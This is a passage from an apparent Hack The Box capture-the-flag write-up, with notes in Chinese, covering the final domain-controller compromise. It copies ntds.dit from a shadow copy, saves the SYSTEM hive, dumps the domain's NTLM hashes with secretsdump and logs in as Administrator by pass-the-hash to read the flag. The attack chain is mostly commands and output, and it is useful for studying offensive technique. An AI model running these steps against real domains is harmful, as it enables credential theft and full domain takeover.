-> %raj% = {d1b2e78d-7f57-490b-8263-17b09bec6e61}
The shadow copy was successfully exposed as z:\.
->
```

`robocopy`
```
*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, June 5, 2024 7:03:49 AM
   Source : z:\windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
```

download
```
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> download ntds.dit

*Evil-WinRM* PS C:\Temp> download system
```

用secret dump，看Administrator就好ㄌ
```
┌──(kali㉿kali)-[~/htb]
└─$ impacket-secretsdump -ntds ntds.dit -system system local

Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...
```

evil-winrm登入，在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.190.70 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```